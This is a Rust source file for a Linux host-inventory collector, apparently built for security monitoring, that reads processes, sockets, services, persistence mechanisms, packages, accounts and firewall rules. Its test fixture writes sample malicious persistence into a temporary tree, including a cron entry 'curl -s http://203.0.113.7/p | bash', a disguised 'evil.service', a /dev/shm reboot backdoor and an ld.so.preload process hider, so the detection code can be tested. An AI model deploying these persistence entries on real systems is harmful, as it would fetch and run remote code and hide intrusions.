#![forbid(unsafe_code)]

//! Live Linux host collector.
//!
//! Everything is read from the running system: processes and sockets from
//! `/proc`, services from systemd unit files (and `systemctl` when systemd
//! is PID 1), persistence from cron / systemd / rc.local / XDG autostart /
//! ld.so.preload, packages from dpkg or rpm, accounts from `/etc/passwd`,
//! the OS from `/etc/os-release`. Nothing is substituted when a source is
//! missing: the corresponding list stays empty and the reason is recorded in
//! [`HostSnapshot::collection_errors`].

use serde::{Deserialize, Serialize};
use thiserror::Error;

pub use host_snapshot::{
    AutorunObservation, FirewallRule, HostSnapshot, ProcessObservation, ScheduledTaskObservation,
    ServiceObservation, SocketObservation, SoftwareObservation, UserAccount,
};

pub mod autostart;
pub mod cron;
pub mod firewall;
pub mod net;
pub mod os;
pub mod process;
pub mod software;
pub mod systemd;
pub mod users;
pub mod util;

pub use process::parse_proc_status;

#[derive(Error, Debug)]
pub enum LinuxPlatformError {
    #[error("Syscall or I/O failed: {0}")]
    IoFailed(String),

    #[error("Parse error: {0}")]
    ParseError(String),

    #[error("Not supported on this platform: {0}")]
    Unsupported(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LinuxProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cmdline: String,
    pub mem_usage_kb: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LinuxFirewallRule {
    pub table: String,
    pub chain: String,
    pub target: String,
    pub protocol: String,
}

/// Thin, typed entry points used by the privilege broker.
pub struct LinuxPlatformHooks;

impl LinuxPlatformHooks {
    pub fn new() -> Self {
        Self
    }

    pub fn get_current_process_id(&self) -> u32 {
        std::process::id()
    }

    /// Running processes from /proc.
    pub fn enumerate_processes(&self) -> Result<Vec<LinuxProcessInfo>, LinuxPlatformError> {
        #[cfg(target_os = "linux")]
        {
            let scan = process::live::collect_processes(
                &host_snapshot::local_hostname(),
                &std::collections::HashMap::new(),
            );
            if scan.processes.is_empty() {
                return Err(LinuxPlatformError::IoFailed(
                    "/proc is not readable".to_string(),
                ));
            }
            Ok(scan
                .processes
                .into_iter()
                .map(|p| LinuxProcessInfo {
                    pid: p.obs.pid,
                    name: p.obs.name,
                    cmdline: p.obs.command_line.unwrap_or_default(),
                    mem_usage_kb: p.vm_rss_kb,
                })
                .collect())
        }
        #[cfg(not(target_os = "linux"))]
        {
            Err(LinuxPlatformError::Unsupported(
                "process enumeration via /proc requires Linux".to_string(),
            ))
        }
    }

    /// Active netfilter rules (`iptables -S`). Fails when no rule source
    /// could be read rather than inventing a baseline.
    pub fn query_firewall_rules(&self) -> Result<Vec<LinuxFirewallRule>, LinuxPlatformError> {
        #[cfg(target_os = "linux")]
        {
            let (rules, errors) = firewall::live::collect();
            if rules.is_empty() && !errors.is_empty() {
                return Err(LinuxPlatformError::IoFailed(errors.join("; ")));
            }
            Ok(rules
                .into_iter()
                .map(|r| {
                    let chain = r
                        .name
                        .split_whitespace()
                        .nth(1)
                        .unwrap_or_default()
                        .to_string();
                    LinuxFirewallRule {
                        table: r.table.unwrap_or_else(|| "filter".to_string()),
                        chain,
                        target: r.action,
                        protocol: r.protocol.unwrap_or_else(|| "all".to_string()),
                    }
                })
                .collect())
        }
        #[cfg(not(target_os = "linux"))]
        {
            Err(LinuxPlatformError::Unsupported(
                "iptables is only available on Linux".to_string(),
            ))
        }
    }
}

impl Default for LinuxPlatformHooks {
    fn default() -> Self {
        Self::new()
    }
}

/// Collects a complete live snapshot of the Linux machine this process runs
/// on. On other operating systems an empty snapshot carrying an explanatory
/// collection error is returned.
pub fn collect_host_snapshot() -> HostSnapshot {
    #[cfg(target_os = "linux")]
    {
        live::collect(std::path::Path::new("/"))
    }
    #[cfg(not(target_os = "linux"))]
    {
        let mut snap = HostSnapshot::empty(
            format!("SNAP-{}", uuid::Uuid::now_v7()),
            host_snapshot::local_hostname(),
            std::env::consts::OS,
            chrono::Utc::now().to_rfc3339(),
        );
        snap.collection_errors
            .push("Сборщик platform-linux работает только на Linux".to_string());
        snap
    }
}

#[cfg(target_os = "linux")]
mod live {
    use super::*;
    use std::collections::{BTreeSet, HashMap};
    use std::path::Path;

    /// `root` relocates configuration files (/etc, /var, /home) so the
    /// directory walkers can be exercised against a fixture tree; /proc is
    /// always the live one.
    pub fn collect(root: &Path) -> HostSnapshot {
        let now = chrono::Utc::now().to_rfc3339();
        let hostname = host_snapshot::local_hostname();
        let mut snap = HostSnapshot::empty(
            format!("SNAP-{}", uuid::Uuid::now_v7()),
            hostname.clone(),
            "linux",
            now.clone(),
        );
        let errors = &mut snap.collection_errors;

        // OS identity.
        let arch = os::live::machine_arch();
        let os_release = os::live::read_os_release(root).unwrap_or_else(|| {
            errors.push("/etc/os-release не найден: дистрибутив не определён".to_string());
            os::OsRelease::default()
        });
        snap.os = format!("{} ({})", os_release.display_name(), arch);
        snap.os_family = os_release.id.clone();
        snap.os_version = os_release.version_id.clone();
        snap.os_codename = os_release.version_codename.clone();
        snap.kernel = os::live::kernel_release().unwrap_or_default();
        snap.architecture = arch;

        // Accounts.
        let passwd = std::fs::read_to_string(root.join("etc/passwd"))
            .map(|c| users::parse_passwd(&c))
            .unwrap_or_else(|e| {
                errors.push(format!("Не удалось прочитать /etc/passwd: {}", e));
                Vec::new()
            });
        let groups = std::fs::read_to_string(root.join("etc/group"))
            .map(|c| users::parse_group(&c))
            .unwrap_or_default();
        snap.user_accounts = users::build_accounts(&passwd, &groups);
        snap.users = passwd.iter().map(|p| p.name.clone()).collect();
        let uid_names = users::uid_name_map(&passwd);
        let home_dirs: Vec<(String, String)> = passwd
            .iter()
            .filter(|p| p.home == "/root" || p.home.starts_with("/home/"))
            .map(|p| (p.name.clone(), p.home.clone()))
            .collect();

        // Processes.
        let scan = process::live::collect_processes(&hostname, &uid_names);
        if scan.processes.is_empty() {
            errors.push("/proc недоступен: процессы не собраны".to_string());
        }
        if scan.unreadable_exe > 0 {
            errors.push(format!(
                "{} процесс(ов): путь к исполняемому файлу недоступен (нужны права \
                 root/CAP_SYS_PTRACE)",
                scan.unreadable_exe
            ));
        }
        if scan.too_large_to_hash > 0 {
            errors.push(format!(
                "{} процесс(ов): исполняемый файл больше {} МиБ, SHA-256 не вычислялся",
                scan.too_large_to_hash,
                host_snapshot::MAX_HASH_BYTES / (1024 * 1024)
            ));
        }
        let mut unit_pids: HashMap<String, Vec<u32>> = HashMap::new();
        for p in &scan.processes {
            if let Some(unit) = &p.systemd_unit {
                unit_pids.entry(unit.clone()).or_default().push(p.obs.pid);
            }
        }
        let pid_names: HashMap<u32, String> = scan
            .processes
            .iter()
            .map(|p| (p.obs.pid, p.obs.name.clone()))
            .collect();
        snap.processes = scan.processes.into_iter().map(|p| p.obs).collect();

        // Sockets.
        snap.sockets = net::live::collect_sockets(&pid_names);

        // Services and systemd persistence.
        let sd = systemd::live::scan(root, &unit_pids, &home_dirs, &now);
        errors.extend(sd.errors);
        let known: BTreeSet<String> = sd.services.iter().map(|s| s.service_name.clone()).collect();
        snap.services = sd.services;
        snap.services
            .extend(systemd::live::sysv_services(root, &known, &now));
        snap.autoruns = sd.autoruns;
        snap.autoruns
            .extend(autostart::live::collect(root, &home_dirs, &now));

        // Scheduled tasks: cron + systemd timers.
        snap.scheduled_tasks = cron::live::collect(root, &now, errors);
        snap.scheduled_tasks.extend(sd.timers);

        // Packages.
        snap.software = software::live::collect(root, &os_release, errors);

        // Firewall.
        let (rules, fw_errors) = firewall::live::collect();
        snap.firewall_rules = rules;
        errors.extend(fw_errors);

        // Addresses.
        snap.ip_addresses = net::live::local_addresses();
        snap.host_ip = host_snapshot::primary_ip()
            .map(|ip| ip.to_string())
            .or_else(|| snap.ip_addresses.first().cloned())
            .unwrap_or_default();
        if snap.host_ip.is_empty() {
            snap.collection_errors
                .push("Не удалось определить основной IP-адрес (нет маршрута)".to_string());
        }
        snap
    }

    #[cfg(test)]
    mod tests {
        use super::*;
        use std::os::unix::fs::PermissionsExt;

        /// Fixture tree exercising the directory walkers end to end.
        fn fixture_root() -> std::path::PathBuf {
            let root = std::env::temp_dir().join(format!(
                "platform-linux-fixture-{}-{}",
                std::process::id(),
                uuid::Uuid::now_v7()
            ));
            let w = |rel: &str, content: &str| {
                let p = root.join(rel);
                std::fs::create_dir_all(p.parent().unwrap()).unwrap();
                std::fs::write(&p, content).unwrap();
                p
            };
            w(
                "etc/os-release",
                "PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\nID=debian\nVERSION_ID=\"12\"\nVERSION=\"12 (bookworm)\"\n",
            );
            w(
                "etc/passwd",
                "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\n",
            );
            w("etc/group", "sudo:x:27:alice\n");
            w(
                "etc/crontab",
                "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
            );
            w("etc/cron.d/backdoor", "@reboot root /dev/shm/.k/agent\n");
            w(
                "var/spool/cron/crontabs/alice",
                "*/10 * * * * curl -s http://203.0.113.7/p | bash\n",
            );
            let daily = w("etc/cron.daily/logrotate", "#!/bin/sh\n");
            std::fs::set_permissions(&daily, std::fs::Permissions::from_mode(0o755)).unwrap();
            w(
                "etc/systemd/system/evil.service",
                "[Unit]\nDescription=Totally legit\n[Service]\nExecStart=/var/tmp/.evil/run --daemon\n[Install]\nWantedBy=multi-user.target\n",
            );
            w(
                "usr/lib/systemd/system/cron.service",
                "[Unit]\nDescription=Regular background program processing daemon\n[Service]\nExecStart=/usr/sbin/cron -f\n[Install]\nWantedBy=multi-user.target\n",
            );
            w(
                "usr/lib/systemd/system/static-only.service",
                "[Unit]\nDescription=Static\n[Service]\nExecStart=/usr/bin/true\n",
            );
            w(
                "usr/lib/systemd/system/backup.timer",
                "[Timer]\nOnCalendar=daily\n[Install]\nWantedBy=timers.target\n",
            );
            w(
                "usr/lib/systemd/system/backup.service",
                "[Service]\nExecStart=/usr/local/bin/backup\nUser=backup\n",
            );
            let wants = root.join("etc/systemd/system/multi-user.target.wants");
            std::fs::create_dir_all(&wants).unwrap();
            std::os::unix::fs::symlink(
                root.join("etc/systemd/system/evil.service"),
                wants.join("evil.service"),
            )
            .unwrap();
            std::os::unix::fs::symlink(
                root.join("usr/lib/systemd/system/cron.service"),
                wants.join("cron.service"),
            )
            .unwrap();
            let timers = root.join("etc/systemd/system/timers.target.wants");
            std::fs::create_dir_all(&timers).unwrap();
            std::os::unix::fs::symlink(
                root.join("usr/lib/systemd/system/backup.timer"),
                timers.join("backup.timer"),
            )
            .unwrap();
            w(
                "home/alice/.config/autostart/updater.desktop",
                "[Desktop Entry]\nName=Updater\nExec=/tmp/.u/update --silent\n",
            );
            w(
                "etc/rc.local",
                "#!/bin/sh -e\n/usr/local/bin/fw-up\nexit 0\n",
            );
            w("etc/ld.so.preload", "/usr/lib/libprocesshider.so\n");
            w(
                "var/lib/dpkg/status",
                "Package: openssl\nStatus: install ok installed\nArchitecture: amd64\nVersion: 3.0.11-1~deb12u2\nMaintainer: Debian <x@y>\n\nPackage: gone\nStatus: deinstall ok config-files\nVersion: 1\n",
            );
            root
        }

        #[test]
        fn collects_fixture_tree_end_to_end() {
            let root = fixture_root();
            let snap = collect(&root);

            assert_eq!(snap.os_family, "debian");
            assert!(snap.os.starts_with("Debian GNU/Linux 12 (bookworm) ("));
            assert_eq!(snap.users, vec!["root", "alice"]);
            assert!(snap
                .user_accounts
                .iter()
                .any(|u| u.name == "alice" && u.admin));

            let cron: Vec<_> = snap
                .scheduled_tasks
                .iter()
                .filter(|t| t.mechanism == "cron")
                .collect();
            assert_eq!(cron.len(), 3);
            assert!(cron
                .iter()
                .any(|t| t.action.as_deref() == Some("/dev/shm/.k/agent")
                    && t.schedule.as_deref() == Some("@reboot")
                    && t.user.as_deref() == Some("root")));
            assert!(cron.iter().any(|t| t.user.as_deref() == Some("alice")
                && t.action.as_deref() == Some("curl -s http://203.0.113.7/p | bash")));
            assert!(
                snap.scheduled_tasks
                    .iter()
                    .any(|t| t.mechanism == "cron_periodic"
                        && t.schedule.as_deref() == Some("@daily"))
            );
            let timer = snap
                .scheduled_tasks
                .iter()
                .find(|t| t.mechanism == "systemd_timer")
                .expect("enabled timer");
            assert_eq!(timer.action.as_deref(), Some("/usr/local/bin/backup"));
            assert_eq!(timer.user.as_deref(), Some("backup"));
            assert_eq!(timer.schedule.as_deref(), Some("OnCalendar=daily"));

            let evil = snap
                .services
                .iter()
                .find(|s| s.service_name == "evil.service")
                .unwrap();
            assert_eq!(evil.start_type, "enabled");
            assert_eq!(evil.binary_path, "/var/tmp/.evil/run --daemon");
            assert_eq!(evil.state, "unknown", "fixture has no running systemd");
            let static_only = snap
                .services
                .iter()
                .find(|s| s.service_name == "static-only.service")
                .unwrap();
            assert_eq!(static_only.start_type, "static");

            let mech = |m: &str| snap.autoruns.iter().filter(|a| a.mechanism == m).count();
            assert_eq!(mech("systemd_service"), 2);
            assert!(snap
                .autoruns
                .iter()
                .any(|a| a.mechanism == "systemd_service"
                    && a.resolved_executable == "/var/tmp/.evil/run"));
            assert_eq!(mech("xdg_autostart"), 1);
            assert_eq!(mech("rc_local"), 1);
            assert_eq!(mech("ld_preload"), 1);
            let xdg = snap
                .autoruns
                .iter()
                .find(|a| a.mechanism == "xdg_autostart")
                .unwrap();
            assert_eq!(xdg.owner.as_deref(), Some("alice"));
            assert_eq!(xdg.resolved_executable, "/tmp/.u/update");

            assert_eq!(snap.software.len(), 1);
            assert_eq!(snap.software[0].product, "openssl");
            assert_eq!(snap.software[0].ecosystem.as_deref(), Some("Debian:12"));
            assert_eq!(
                snap.software[0].purl.as_deref(),
                Some("pkg:deb/debian/openssl@3.0.11-1~deb12u2?arch=amd64&distro=debian-12")
            );

            let _ = std::fs::remove_dir_all(&root);
        }
    }
}

#[cfg(all(test, target_os = "linux"))]
mod live_host_tests {
    use super::*;

    fn current_uid() -> u32 {
        let status = std::fs::read_to_string("/proc/self/status").unwrap();
        process::parse_status_fields(&status).uid.unwrap()
    }

    /// Collects the real snapshot of the machine running the test and checks
    /// it against facts the test can establish independently.
    #[test]
    fn live_snapshot_describes_this_machine() {
        // Sockets the snapshot must attribute to this very process.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let tcp_port = listener.local_addr().unwrap().port();
        let udp = std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
        let udp_port = udp.local_addr().unwrap().port();

        let snap = collect_host_snapshot();
        let me = std::process::id();

        assert_eq!(snap.platform, "linux");
        assert_eq!(snap.host, host_snapshot::local_hostname());
        assert_ne!(snap.host_ip, "127.0.0.1");
        assert!(!snap.os.contains("Windows"));
        let kernel = std::fs::read_to_string("/proc/sys/kernel/osrelease").unwrap();
        assert_eq!(snap.kernel, kernel.trim());
        if std::path::Path::new("/etc/os-release").exists() {
            let osr = os::parse_os_release(&std::fs::read_to_string("/etc/os-release").unwrap());
            assert_eq!(snap.os_family, osr.id);
            assert!(snap.os.starts_with(&osr.display_name()));
        }

        // The current process, with its real executable path.
        let proc_me = snap
            .processes
            .iter()
            .find(|p| p.pid == me)
            .expect("snapshot must contain the current process");
        let exe = std::env::current_exe().unwrap().canonicalize().unwrap();
        assert_eq!(
            proc_me.executable_path.as_deref(),
            Some(exe.to_str().unwrap())
        );
        assert!(!proc_me.exe_deleted);
        assert!(proc_me
            .command_line
            .as_deref()
            .unwrap()
            .contains(exe.file_name().unwrap().to_str().unwrap()));
        assert_eq!(proc_me.uid, Some(current_uid()));
        assert_eq!(
            proc_me.ppid,
            process::parse_proc_stat(&std::fs::read_to_string("/proc/self/stat").unwrap())
                .unwrap()
                .ppid
        );
        assert!(proc_me.started_at.is_some());
        assert_eq!(proc_me.architecture, std::env::consts::ARCH);

        // At least one real account, and the owner of this process resolves.
        let passwd = users::parse_passwd(&std::fs::read_to_string("/etc/passwd").unwrap());
        assert!(!snap.users.is_empty());
        if let Some(entry) = passwd.iter().find(|p| p.uid == current_uid()) {
            assert!(snap.users.contains(&entry.name));
            assert_eq!(proc_me.username.as_deref(), Some(entry.name.as_str()));
        }

        // Socket -> pid attribution through /proc/<pid>/fd.
        assert!(
            snap.sockets.iter().any(|s| s.protocol == "TCP"
                && s.local_port == tcp_port
                && s.state == "Listen"
                && s.pid == me),
            "listening TCP socket on port {} must be attributed to pid {}",
            tcp_port,
            me
        );
        assert!(snap
            .sockets
            .iter()
            .any(|s| s.protocol == "UDP" && s.local_port == udp_port && s.pid == me));

        // Packages, when a dpkg database exists.
        if std::path::Path::new("/var/lib/dpkg/status").exists() {
            assert!(snap.software.iter().any(|s| s.source == "dpkg"));
            assert!(snap
                .software
                .iter()
                .all(|s| s.purl.as_deref().is_some_and(|p| p.starts_with("pkg:deb/"))));
        }
        drop(listener);
        drop(udp);
    }

    #[test]
    fn hooks_return_real_processes() {
        let hooks = LinuxPlatformHooks::new();
        let procs = hooks.enumerate_processes().unwrap();
        let me = procs
            .iter()
            .find(|p| p.pid == std::process::id())
            .expect("current process listed");
        assert!(me.mem_usage_kb > 0);
        assert!(!me.cmdline.is_empty());
    }
}
